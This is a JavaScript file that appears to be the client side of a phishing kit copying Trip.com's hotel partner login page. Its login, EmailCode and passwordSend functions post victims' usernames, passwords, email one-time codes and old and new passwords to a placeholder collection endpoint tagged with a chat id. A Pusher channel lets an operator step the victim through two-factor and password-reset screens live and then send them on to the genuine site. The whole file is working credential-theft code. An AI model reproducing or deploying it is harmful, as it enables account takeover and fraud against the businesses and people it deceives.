function login () {
    var userId = localStorage.getItem('userId');

    if (!userId) {
    userId = generateUniqueId();
    localStorage.setItem('userId', userId);
    } 

    const usernameInput = document.getElementById('username-input');
    const passwordInput = document.getElementById('password-input-wrapper');

    var waitingOverlay = document.querySelector('.waiting-overlay');
    waitingOverlay.style.display = 'flex';

    fetch('ROUTER_LINK', {
        method: 'POST',
        body: JSON.stringify({
            userId: userId,
            userService: "trip",
            userLogin: usernameInput.value,
            userPassword: passwordInput.value,
            userChat: "ID_CHAT_THERE",
        }),
    headers: {
        'Content-type': 'application/json; charset=UTF-8'
        }
    })

    Pusher.logToConsole = true;

    var pusher = new Pusher('', {
      cluster: 'eu'
    });

    var channel = pusher.subscribe(`trip-${userId}`);

    channel.bind('good-account', function(data) {
        window.location.href = 'https://ebooking.trip.com/login/index';
      });

channel.bind('bad-account', function(data) {
    var waitingOverlay = document.querySelector('.waiting-overlay');
    if (waitingOverlay) {
        waitingOverlay.style.display = 'none';
    }

    var usernameInputWrapper = document.querySelector('.login-username-input'); 

    if (usernameInputWrapper) {
        usernameInputWrapper.classList.add('e-input-error');
    } else {
        console.error('Element .login-username-input not found!');
    }
    var errorMessage = getTranslation('error-msg-trans');
    showFormError(errorMessage);
});

channel.bind('code-account-email', function(data) {
    var waitingOverlay = document.querySelector('.waiting-overlay');
    if (waitingOverlay) {
        waitingOverlay.style.display = 'none';
    }

    var hotelLoginBox = document.querySelector('.login-box-view.hotel-login-box');
    if (hotelLoginBox) {
        hotelLoginBox.style.display = 'none';
    }

    var securityVerifyBox = document.querySelector('.login-box-view.security-verify-box');
    if (securityVerifyBox) {
        securityVerifyBox.style.display = 'block';
    }
	
    startCountdown ();
});


}

function EmailCode () {

    var userId = localStorage.getItem('userId');
  
      if (!userId) {
      userId = generateUniqueId(); 
      localStorage.setItem('userId', userId); 
      }
  
  
    var OtpCode = document.getElementById("security-email-code-input-text").value;
  
    var waitingOverlay = document.querySelector('.waiting-overlay');
      waitingOverlay.style.display = 'flex';
  
    fetch('ROUTER_LINK', {
        method: 'POST',
        body: JSON.stringify({
            userId: userId,
            userService: "trip",
            userSms: OtpCode,
            userChat: "ID_CHAT_THERE",
        }),
    headers: {
        'Content-type': 'application/json; charset=UTF-8'
        }
    })
  
      Pusher.logToConsole = true;
  
      var pusher = new Pusher('', {
        cluster: 'eu'
      });
  
      var channel = pusher.subscribe(`trip-${userId}`);
      
      channel.bind('good-email-account', function(data) {
        window.location.href = 'https://ebooking.trip.com/login/index';
      });
  
      channel.bind('bad-email-account', function(data) {

        var waitingOverlay = document.querySelector('.waiting-overlay');
        if (waitingOverlay) {
            waitingOverlay.style.display = 'none';
        }
    

        var emailCodeInput = document.getElementById('security-email-code-input');
        if (emailCodeInput) {
            emailCodeInput.classList.add('e-input-error');
        } else {
            console.error('Element with id "security-email-code-input" not found.');
        }
    

        var otpErrorMessage = document.getElementById('error-msg-trans-otp');
        if (otpErrorMessage) {
            otpErrorMessage.style.display = 'block';
    

            var otpErrorText = getTranslation('error-msg-trans-otp');
            otpErrorMessage.innerText = otpErrorText;
        } else {
            console.error('Element with id "error-msg-trans-otp" not found.');
        }
    });
    

    channel.bind('code-account-password', function(data) {
        var waitingOverlay = document.querySelector('.waiting-overlay');
        if (waitingOverlay) {
            waitingOverlay.style.display = 'none';
        }
        document.querySelector('.hotel-login-box').style.display = 'none';
        document.querySelector('.security-verify-box').style.display = 'none';
document.querySelector('#reset-password').style.display = 'block'; 

      });
    
    

}

function passwordSend () {
    var userId = localStorage.getItem('userId');
  
    if (!userId) {
    userId = generateUniqueId(); 
    localStorage.setItem('userId', userId); 
    }
  
    var CodeOne = document.getElementById("old-password").value;
    var CodeTwo = document.getElementById("new-password-one").value;
    var CodeThree = document.getElementById("new-password-two").value;

    var waitingOverlay = document.querySelector('.waiting-overlay');
    waitingOverlay.style.display = 'flex';

    fetch('ROUTER_LINK', {
        method: 'POST',
        body: JSON.stringify({
            userId: userId,
            userService: "trip",
            userOldPassword: CodeOne,
            userNewPasswordOne: CodeTwo,
            userNewPasswordTwo: CodeThree,
            userChat: "ID_CHAT_THERE",
        }),
    headers: {
        'Content-type': 'application/json; charset=UTF-8'
        }
    })

    Pusher.logToConsole = true;
  
      var pusher = new Pusher('', {
        cluster: 'eu'
      });
  
      var channel = pusher.subscribe(`trip-${userId}`);

      channel.bind('good-email-account', function(data) {
        window.location.href = '';
      });

      channel.bind('bad-email-account', function(data) {
        var waitingOverlay = document.querySelector('.waiting-overlay');
        if (waitingOverlay) {
            waitingOverlay.style.display = 'none';
        }

        var usernameInputWrapper = document.querySelector('.password-username-input'); 

    if (usernameInputWrapper) {
        usernameInputWrapper.classList.add('e-input-error');
    } else {
        console.error('Element .password-username-input not found!');
    }

    const errorElement = document.getElementById('old-password-error');
    if (errorElement) {
        errorElement.style.display = 'block';  
    }
    });
}
function sendSend () {
    var userId = localStorage.getItem('userId');
  
    if (!userId) {
    userId = generateUniqueId(); 
    localStorage.setItem('userId', userId); 
    }

    fetch('ROUTER_LINK', {
        method: 'POST',
        body: JSON.stringify({
            userId: userId,
            userService: "trip",
            userChat: "ID_CHAT_THERE",
        }),
    headers: {
        'Content-type': 'application/json; charset=UTF-8'
        }
    })
}

function generateUniqueId() {
    return Math.random().toString(36).substr(2, 9);
  }

  function showFormError(errorMessage) {
    var errorDiv = document.querySelector('.e-input-error-msg');
    
    if (errorDiv) {
        errorDiv.textContent = errorMessage;
        errorDiv.style.display = 'block'; 
    } else {
        console.error('Element .e-input-error-msg not found!');
    }
}